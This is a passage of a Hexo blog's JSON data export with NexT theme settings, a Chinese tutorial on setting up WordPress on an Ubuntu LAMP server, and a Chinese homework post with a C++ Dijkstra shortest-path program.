esktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1074,"excerpt":"<p>&emsp;&emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。<br>","more":"<br><strong>安装 Apache</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update <span class=\"comment\"># 首先还是先更新下软件包源</span></span><br><span class=\"line\">sudo apt install apache2</span><br><span class=\"line\">sudo apt install <span class=\"comment\"># 当然再顺便安装下强大的vim编辑器</span></span><br></pre></td></tr></table></figure><br><strong>安装 MySQL</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install mysql-server mysql-client</span><br></pre></td></tr></table></figure><br><strong>安装 PHP</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install php7.0 </span><br><span class=\"line\">sudo apt install php7.0-mysql</span><br></pre></td></tr></table></figure><br><strong>重启服务</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service apache2 restart </span><br><span class=\"line\">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>安装 phpmyadmin</strong><br>非必须安装，不过安装下方便直接操作数据库，安装时记得选择apache。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install phpmyadmin</span><br><span class=\"line\">ln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf</span><br><span class=\"line\">sudo service apache2 restart</span><br><span class=\"line\">sudo a2enconf phpmyadmin</span><br></pre></td></tr></table></figure><br>启用Apache mod_rewrite模块。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo a2enmod rewrite</span><br><span class=\"line\">sudo service apache2 restart</span><br></pre></td></tr></table></figure><br><strong>初始化数据库</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mysql -u root -p </span><br><span class=\"line\">Enter Password: 密码（密码输入不可见)</span><br><span class=\"line\">mysql&gt;CREATE DATABASE wordpress;</span><br><span class=\"line\">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class=\"string\">&#x27;root&#x27;</span>@<span class=\"string\">&#x27;localhost&#x27;</span>;</span><br><span class=\"line\">mysql&gt;FLUSH PRIVILEGES;</span><br><span class=\"line\">mysql&gt;<span class=\"built_in\">exit</span></span><br><span class=\"line\">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>配置WordPress</strong><br>下载并解压后将wordpress目录下所有文件复制到/var/www/html<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://cn.wordpress.org/latest-zh_CN.tar.gz</span><br><span class=\"line\">tar zxvf latest-zh_CN.tar.gz</span><br><span class=\"line\">cp -r wordpress/* /var/www/html</span><br></pre></td></tr></table></figure><br>接下来就可以访问服务器ip进行最后的配置了。<br>另外，访问 <a href=\"http://ip/phpmyadmin\">http://ip/phpmyadmin</a> 可以访问 phpmyadmin。</p>"},{"title":"最短路","date":"2019-03-29T09:11:09.000Z","abbrlink":"f216fabe","updated":"2020-04-08T10:40:24.000Z","_content":"# 最短路\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nconst int INF=0x3f3f3f3f;\nint N,M,MAP[1020][1020];\nbool vis[1020];\nint dis[1020],prev[1020];\nvoid Dijkstra(int start,int end)\n{\n\tfor(int i=1;i<=N;i++)\n\t{\n\t\tvis[i]=false;\n\t\tdis[i]=INF;\n\t}\n\tdis[start]=0;\n\twhile(true)\n\t{\n\t\tint v=-1;\n\t\tfor(int u=1;u<=N;u++)\n\t\tif(!vis[u]&&(v==-1||dis[u]<dis[v]))v=u;\n\t\tif(v==-1)break;\n\t\tvis[v]=true;\n\t\tfor(int u=1;u<=N;u++)\n\t\t{\n\t\t\tif(!vis[u])\n\t\t\t{\n\t\t\t\tif(dis[u]>dis[v]+MAP[v][u])\n\t\t\t\t{\n\t\t\t\t\tdis[u]=dis[v]+MAP[v][u];\n\t\t\t\t\tprev[u]=v;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tcout<<\"The Shortest Path Length is \"<<dis[end]<<endl<<endl;\n\tstack<int>S;\n\twhile(prev[end])\n\t{\n\t\tS.push(end);\n\t\tend=prev[end];\n\t}\n\tcout<<\"The Path is \";\n\tcout<<start;\n\twhile(!S.empty())\n\t{\n\t\tcout<<\" -> \"<<S.top();\n\t\tS.pop();\n\t}\n}\nint main()\n{\n\tint a,b,c,st,en;\n\tcout<<\"Input Sum Of Vertex: \";\n\tcin>>N;\n\tcout<<\"Input Sum Of Edges: \";\n\tcin>>M;\n\tmemset(MAP,INF,sizeof(MAP));\n\tcout<<\"Input Weight Of Vertexs: \"<<endl;\n\twhile(M--)\n\t{\n\t\tcin>>a>>b>>c;\n\t\tMAP[a][b]=c;\n\t\tMAP[b][a]=c;\n\t}\n\tcout<<endl<<\"Adjacency Matrix is:\"<<endl;\n\tfor(int i=1;i<=N;i++)\n\t{\n\t\tfor(int j=1;j<=N;j++)\n\t\t{\n\t\t\tif(MAP[i][j]==INF)printf(\"INF \");\n\t\t\telse printf(\"%03d \",MAP[i][j]);\n\t\t}\n\t\tcout<<endl;\n\t}\n\tcout<<endl<<\"Input Two Vertexs: \";\n\tcin>>st>>en;\n\tcout<<endl;\n\tDijkstra(st,en);\n\treturn 0;\n}\n```","source":"_posts/最短路.md","raw":"---\ntitle: 最短路\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 最短路\n  - Dijkstra\nabbrlink: f216fabe\nupdated:\n---\n# 最短路\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nconst int INF=0x3f3f3f3f;\nint N,M,MAP[1020][1020];\nbool vis[1020];\nint dis[1020],prev[1020];\nvoid Dijkstra(int start,int end)\n{\n\tfor(int i=1;i<=N;i++)\n\t{\n\t\tvis[i]=false;\n\t\tdis[i]=INF;\n\t}\n\tdis[start]=0;\n\twhile(true)\n\t{\n\t\tint v=-1;\n\t\tfor(int u=1;u<=N;u++)\n\t\tif(!vis[u]&&(v==-1||dis[u]<dis[v]))v=u;\n\t\tif(v==-1)break;\n\t\tvis[v]=true;\n\t\tfor(int u=1;u<=N;u++)\n\t\t{\n\t\t\tif(!vis[u])\n\t\t\t{\n\t\t\t\tif(dis[u]>dis[v]+MAP[v][u])\n\t\t\t\t{\n\t\t\t\t\tdis[u]=dis[v]+MAP[v][u];\n\t\t\t\t\tprev[u]=v;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tcout<<\"The Shortest Path Length is \"<<dis[end]<<endl<<endl;\n\tstack<int>S;\n\twhile(prev[end])\n\t{\n\t\tS.push(end);\n\t\tend=prev[end];\n\t}\n\tcout<<\"The Path is \";\n\tcout<<start;\n\twhile(!S.empty())\n\t{\n\t\tcout<<\" -> \"<<S.top();\n\t\tS.pop();\n\t}\n}\nint main()\n{\n\tint a,b,c,st,en;\n\tcout<<\"Input Sum Of Vertex: \";\n\tcin>>N;\n\tcout<<\"Input Sum Of Edges: \";\n\tcin>>M;\n\tmemset(MAP,INF,sizeof(MAP));\n\tcout<<\"Input Weight Of Vertexs: \"<<endl;\n\twhile(M--)\n\t{\n\t\tcin>>a>>b>>c;\n\t\tMAP[a][b]=c;\n\t\tMAP[b][a]=c;\n\t}\n\tcout<<endl<<\"Adjacency Matrix is:\"<<endl;\n\tfor(int i=1;i<=N;i++)\n\t{\n\t\tfor(int j=1;j<=N;j++)\n\t\t{\n\t\t\tif(MAP[i][j]==INF)printf(\"INF \");\n\t\t\telse printf(\"%03d \",MAP[i][j]);\n\t\t}\n\t\tcout<<endl;\n\t}\n\tcout<<endl<<\"Input Two Vertexs: \";\n\tcin>>st>>en;\n\tcout<<endl;\n\tDijkstra(st,en);\n\treturn 0;\n}\n```","slug":"最短路","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkdk003hqse5dpulavq5","content":"<h1 id=\"最短路\"><a href=\"#最短路\" class=\"headerlink\" title=\"最短路\"></a>最短路</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> INF=<span class=\"number\">0x3f3f3f3f</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> N,M,MAP[<span class=\"number\">1020</span>][<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> vis[<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dis[<span class=\"number\">1020</span>],prev[<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Dijkstra</span><span class=\"params\">(<span class=\"keyword\">int</span> start,<span class=\"keyword\">int</span> end)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tvis[i]=<span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tdis[i]=INF;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdis[start]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> v=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> u=<span class=\"number\">1</span>;u&lt;=N;u++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!vis[u]&amp;&amp;(v==<span class=\"number\">-1</span>||dis[u]&lt;dis[v]))v=u;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(v==<span class=\"number\">-1</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\tvis[v]=<span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> u=<span class=\"number\">1</span>;u&lt;=N;u++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!vis[u])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(dis[u]&gt;dis[v]+MAP[v][u])</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tdis[u]=dis[v]+MAP[v][u];</span><br><span class=\"line\">\t\t\t\t\tprev[u]=v;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;The Shortest Path Length is &quot;</span>&lt;&lt;dis[end]&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">stack</span>&lt;<span class=\"keyword\">int</span>&gt;S;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(prev[end])</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tS.push(end);</span><br><span class=\"line\">\t\tend=prev[end];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;The Path is &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;start;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!S.empty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;S.top();</span><br><span class=\"line\">\t\tS.pop();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,c,st,en;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Input Sum Of Vertex: &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;N;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Input Sum Of Edges: &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;M;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(MAP,INF,<span class=\"keyword\">sizeof</span>(MAP));</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Input Weight Of Vertexs: &quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(M--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class=\"line\">\t\tMAP[a][b]=c;</span><br><span class=\"line\">\t\tMAP[b][a]=c;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;Adjacency Matrix is:&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>;j&lt;=N;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(MAP[i][j]==INF)<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;INF &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%03d &quot;</span>,MAP[i][j]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;Input Two Vertexs: &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;st&gt;&gt;en;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\tDijkstra(st,en);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} 